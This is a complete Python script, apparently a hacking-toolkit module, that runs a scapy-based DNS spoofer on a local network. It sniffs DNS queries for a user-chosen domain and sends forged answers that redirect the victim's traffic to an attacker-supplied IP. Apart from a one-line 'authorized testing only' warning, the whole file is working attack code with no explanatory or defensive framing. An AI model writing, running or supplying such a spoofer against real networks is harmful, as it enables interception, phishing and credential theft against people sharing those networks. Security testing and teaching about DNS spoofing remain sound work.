#!/usr/bin/env python3
"""
DNS Spoofing Tool
A tool that answers DNS queries with false records to redirect traffic.
"""

import sys

def run():
    print("\033[92m" + "="*70)
    print("           DNS SPOOFING TOOL - Traffic Redirection")
    print("="*70 + "\033[0m\n")
    
    print("\033[91m[!] WARNING: Use only for authorized security testing!\033[0m\n")
    
    try:
        from scapy.all import sniff, DNS, DNSQR, DNSRR, IP, UDP, send
    except ImportError:
        print("\033[91m[!] Scapy library not found.\033[0m")
        print("\033[97m[*] Install it with: pip install scapy\033[0m")
        return
    
    target_domain = input("\033[97m[?] Enter domain to spoof (e.g., example.com): \033[0m").strip()
    spoof_ip = input("\033[97m[?] Enter IP to redirect to: \033[0m").strip()
    
    if not target_domain or not spoof_ip:
        print("\033[91m[!] Both domain and IP are required.\033[0m")
        return
    
    interface = input("\033[97m[?] Enter network interface (leave blank for default): \033[0m").strip()
    
    print(f"\n\033[92m[*] Starting DNS spoofer...\033[0m")
    print(f"\033[97m[*] Spoofing {target_domain} -> {spoof_ip}\033[0m")
    print(f"\033[93m[*] Press Ctrl+C to stop\033[0m\n")
    
    def process_packet(packet):
        if packet.haslayer(DNSQR):
            qname = packet[DNSQR].qname.decode('utf-8', errors='ignore')
            
            if target_domain in qname:
                print(f"\033[92m[+] Spoofing DNS query for {qname}\033[0m")
                
                # Create spoofed DNS response
                spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                              UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                              DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                                  an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=spoof_ip))
                
                send(spoofed_pkt, verbose=False)
                print(f"\033[93m[*] Sent spoofed response: {qname} -> {spoof_ip}\033[0m")
    
    try:
        if interface:
            sniff(filter="udp port 53", prn=process_packet, iface=interface, store=False)
        else:
            sniff(filter="udp port 53", prn=process_packet, store=False)
    
    except PermissionError:
        print("\033[91m[!] Permission denied. Run as root/administrator.\033[0m")
    except KeyboardInterrupt:
        print("\n\033[92m[*] DNS spoofing stopped.\033[0m")
    except Exception as e:
        print(f"\033[91m[!] Error: {str(e)}\033[0m")

if __name__ == "__main__":
    run()
